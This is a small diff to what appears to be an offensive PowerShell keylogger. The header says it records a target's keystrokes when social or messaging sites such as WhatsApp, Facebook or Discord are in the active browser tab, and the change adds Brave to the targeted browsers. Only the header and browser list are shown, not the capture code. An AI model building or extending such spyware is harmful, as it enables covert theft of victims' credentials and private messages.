@@ -1,6 +1,6 @@
 ﻿<#
 .SYNOPSIS
-   Browser keyboad keystrokes capture
+   Active browser tab keyboad keystrokes capture
 
    Author: @r00t-3xp10it
    Tested Under: Windows 10 (19044) x64 bits
@@ -9,8 +9,8 @@
    PS cmdlet Dev version: v1.5.20
    
 .DESCRIPTION
-   Record keyboard keystrokes if target has WhatsApp,Facebook
-   Twitter,Discord,Telegram,Instagram in the 'active browser tab'
+   Start record keyboard keystrokes if target has WhatsApp, Facebook,
+   Twitter, Discord, Telegram, Instagram in the 'active browser tab'
 
 .NOTES
    Browsers supported: MsEdge,Chrome,Chromium,Opera,Safari,Firefox.
@@ -157,6 +157,7 @@ $BrowserNames = @(
    "Chrome",
    "msedge",
    "Safari",
+   "Brave",
    "Opera"
 )
 
